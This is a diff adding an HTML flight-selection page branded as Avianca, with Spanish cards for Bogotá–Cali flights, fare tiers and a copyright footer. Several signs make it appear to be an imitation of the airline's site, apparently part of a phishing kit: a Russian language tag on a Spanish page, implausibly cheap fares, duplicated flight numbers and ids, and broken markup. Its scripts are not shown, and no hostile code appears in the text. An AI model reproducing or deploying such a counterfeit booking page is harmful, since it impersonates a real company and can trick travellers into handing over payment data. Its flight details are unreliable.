@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avianca - Booking</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="shortcut icon" href="./assets/a.png" t ype="image/x-icon">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="./css/flight.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+
+    <!-- START -->
+    <script src="./js/functions.js"></script>
+</head>
+
+<body class="mvh-100 bg-gray sb2-hidden">
+    <!-- ON LOADER -->
+    <div class="loader show">
+        <img class="" src="./assets/svg/plane-loader.gif">
+    </div>
+
+
+    <header>
+        <div class="details--container">
+            <div class="details">
+                <img src="./assets/logos/avianca_red (2).svg">
+                <h4 id="origin-code">BOG</h4>
+                <img src="./assets/svg/arrow (2).png" width="14px">
+                <h4 id="destination-code">CLI</h4>
+                <span>|</span>
+                <p id="flight-date">Dic 22</p>
+                <span>|</span>
+                <img id="btn-edit-flight" src="./assets/svg/pen.png" width="18px">
+            </div>
+        </div>
+    </header>
+
+
+    <main>
+        <div id="flight-cards">
+            <div onclick="loadFlight('flight_1')" class="card-departure mt-2">
+                <div class="best-price-label">
+                    <p>Mejor precio</p>
+                </div>
+                <p class="fs-5 text-center mt-3"> Directo • 1h 15m • AV 8908</p>
+                <div class="card-departure-distance">
+                    <h4>07:15</h4>
+                    <br>
+                    <hr>
+                    <h4>08:30 </h4>
+                </div>
+                <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
+                <h4 class="text-end mt-1">$<span id="flight-price-1">49.900 COP</span></h4>
+            </div>
+
+            <div onclick="loadFlight('flight_2')" class="card-departure mt-2">
+                <div class="best-price-label">
+                    <p>Más vendido</p>
+                </div>
+                <p class="fs-5 text-center mt-2"> Directo • 1h 15m • AV 8904 </p>
+                <div class="card-departure-distance">
+                    <h4>8:45</h4>
+                    <hr>
+                    <h4>10:00</h4>
+                </div>
+                <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
+                <h4 class="text-end mt-1">$<span id="flight-price-2">150.900 COP</span></h4>
+            </div>
+
+            <div onclick="loadFlight('flight_3')" class="card-departure mt-2">
+                <p class="fs-5 text-center mt-2"> Directo • 1h 15m • AV 8704</p>
+                <div class="card-departure-distance">
+                    <h4>10:15 </h4>
+                    <hr>
+                    <h4>11:30 </h4>
+                </div>
+                <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
+                <h4 class="text-end mt-1">$<span id="flight-price-3">210.900 COP</span></h4>
+            </div>
+        </div>
+
+
+        <div onclick="loadFlight('flight_3')" class="card-departure mt-2">
+            <p class="fs-5 text-center mt-2"> Directo • 1h 15m • AV 8704</p>
+            <div class="card-departure-distance">
+                <h4>13:45 </h4>
+                <hr>
+                <h4>15:00 </h4>
+            </div>
+            <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
+            <h4 class="text-end mt-1">$<span id="flight-price-3">250.500 COP</span></h4>
+        </div>
+        </div>
+
+
+        <div onclick="loadFlight('flight_3')" class="card-departure mt-2">
+            <p class="fs-5 text-center mt-2"> Directo • 1h 15m • AV 8704</p>
+            <div class="card-departure-distance">
+                <h4>18:00 </h4>
+                <hr>
+                <h4>19:15 </h4>
+            </div>
+            <br>
+            <br>
+
+            <div class="card-departure-distance">
+                <h4>21:45 </h4>
+                <hr>
+                <h4>23:00 </h4>
+            </div>
+
+            <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
+            <h4 class="text-end mt-1">$<span id="flight-price-3">232.300 COP</span></h4>
+        </div>
+        </div>
+
+
+        <div onclick="loadFlight('flight_3')" class="card-departure mt-2">
+            <p class="fs-5 text-center mt-2"> Directo • 1h 15m • AV 8704</p>
+            <div class="card-departure-distance">
+                <h4>12:00 </h4>
+                <hr>
+                <h4>1:15 </h4>
+            </div>
+            <br>
+            <br>
+
+            <div class="card-departure-distance">
+                <h4>2:15 </h4>
+                <hr>
+                <h4>3:15 </h4>
+            </div>
+
+            <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
+            <h4 class="text-end mt-1">$<span id="flight-price-3">156.900 COP</span></h4>
+        </div>
+        </div>
+
+
+        <div class="conditions mt-3">
+            <div>
+                <img src="./assets/svg/dot_menu (1).png" width="25px" style="margin-right: 10px;">
+                <p style="float: right; margin-top: 3px;">Condiciones tarifarias</p>
+            </div>
+
+            <img src="./assets/svg/down_arrow.png" width="15px">
+        </div>
+
+    </main>
+
+    <div class="modal mt-10" id="modal-select-ticket">
+        <div class="modal-header">
+            <img id="modal-close-ticket" src="./assets/svg/left-arrow (1).png" width="14px">
+            <p>Selecciona tu tarifa</p>
+        </div>
+        <div class="ticket-label">
+            <p>ECONÓMICA</p>
+        </div>
+
+        <div class="modal-body">
+
+            <div class="ct-item mb-2">
+                <img src="./assets/svg/info_icon (1).png" width="18px">
+                <p>Los vuelos sujetos a promociones no podrán escoger su asiento.</p>
+            </div>
+
+            <div class="card-container xs">
+                <div class="card-ticket">
+                    <h2 class="card-ticket-type">basic</h2>
+                    <p class="card-ticket-label">Vuela ligero</p>
+                    <div class="card-ticket-items">
+                        <div class="ct-item">
+                            <img src="./assets/svg/personalItemLowest-XS.svg" width="18px">
+                            <p>1 artículo personal (bolso)</p>
+                        </div>
+                        <div class="ct-item">
+                            <img src="./assets/svg/mileageAcrual-XS.svg" width="18px">
+                            <p>Acumula 3 lifemiles por cada cop</p>
+                </div>
+                <div class="card-ticket-header" onclick="nextStep('xs')">
+                    <h6 class="fs-3">
+                        <p>49.900</p><span id="x"></span>
+                    </h6>
+                    <p class="fs-5">Precio por pasajero</p>
+                  </div>
+            </div>
+
+
+            <div class="card-container s">
+                <div class="card-ticket">
+                    <h2 class="card-ticket-type">classic</h2>
+                    <p class="card-ticket-label">Más completo</p>
+                    <div class="card-ticket-items">
+                        <div class="ct-item">
+                            <img src="./assets/svg/personalItemLowest-S.svg" width="18px">
+                            <p>1 artículo personal (bolso)</p>
+                        </div>
+                        <div class="ct-item">
+                            <img src="./assets/svg/carryOnBaggage-S (1).svg" width="18px">
+                            <p>1 equipaje de mano (10 kg)</p>
+                        </div>
+                        <div class="ct-item">
+                            <img src="./assets/svg/carryOnBaggage-S (1).svg" width="18px">
+                            <p>1 equipaje de bodega (23 kg)</p>
+                        </div>
+                        <div class="ct-item">
+                            <img src="./assets/svg/airportCheckin-S (1).svg" width="18px">
+                            <p>Check-in en aeropuerto</p>
+                        </div>
+                        <div class="ct-item">
+                            <img src="./assets/svg/standardSeat-S (1).svg" width="18px">
+                            <p>Asiento Economy incluido</p>
+                        </div>
+                        <div class="ct-item">
+                            <img src="./assets/svg/mileageAcrual-S.svg" width="18px">
+                            <p>Acumula 6 lifemiles por cada cop</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="card-ticket-header" onclick="nextStep('s')">
+                    <h6 class="fs-3">
+                        <p>$ 180.200<span id=""></span>
+                    </h6>
+                    <p class="fs-5">Precio por pasajero</p>
+                </div>
+            </div>
+
+
+            <div class="card-container m">
+                <div class="card-ticket">
+                    <h2 class="card-ticket-type">flex</h2>
+                    <p class="card-ticket-label">Más posibilidades</p>
+                    <div class="card-ticket-items">
+                        <div class="ct-item">
+                            <img src="./assets/svg/personalItemLowest-M.svg" width="18px">
+                            <p>1 artículo personal (bolso)</p>
+                        </div>
+                        <div class="ct-item">
+                            <img src="./assets/svg/carryOnBaggage-M (3).svg" width="18px">
+                            <p>1 equipaje de mano (10 kg) + bolso</p>
+                        </div>
+                        <div class="ct-item">
+                            <img src="./assets/svg/baggageAllowance-M (1).svg" width="18px">
+                            <p>1 equipaje de bodega (23 kg)</p>
+                        </div>
+                        <div class="ct-item">
+                            <img src="./assets/svg/airportCheckin-M (1).svg" width="18px">
+                            <p>Check-in en aeropuerto</p>
+                        </div>
+                        <div class="ct-item">
+                            <img src="./assets/svg/standardSeat-M.svg" width="18px">
+                            <p>Asiento Plus (sujeto a disponibilidad)y</p>
+                        </div>
+                        <div class="ct-item">
+                            <img src="./assets/svg/mileageAcrual-M.svg" width="18px">
+                            <p>Acumula 8 lifemiles por cada USD</p>
+                        </div>
+                        <div class="ct-item">
+                            <img src="./assets/svg/TimerCountDown.svg" width="18px">
+                            <p>Cambios (antes del vuelo)</p>
+                        </div>
+                        <div class="ct-item">
+                            <img src="./assets/svg/TimerCountDown (1).svg" width="18px">
+                            <p>Reembolso (antes del vuelo)</p>
+                        </div>
+                        <div class="ct-item">
+                            <img src="./assets/svg/TablerX (1).svg" width="18px">
+                            <p>Menú a bordo</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="card-ticket-header" onclick="nextStep('m')">
+                    <h6 class="fs-3">
+                        <p>$ 226.500 </p><span id="m"></span>
+                    </h6>
+                    <p class="fs-5">Precio por pasajero</p>
+                </div>
+                <br>
+
+
+            </div>
+        </div>
+     
+    </div>
+
+    <footer class="footer-fixed">
+        <p>© Avianca S.A 2024</p>
+    </footer>
+    <!-- SCRIPTS -->
+    <script src="./js/flight-detail.js"></script>
+</body>
+
+</html>
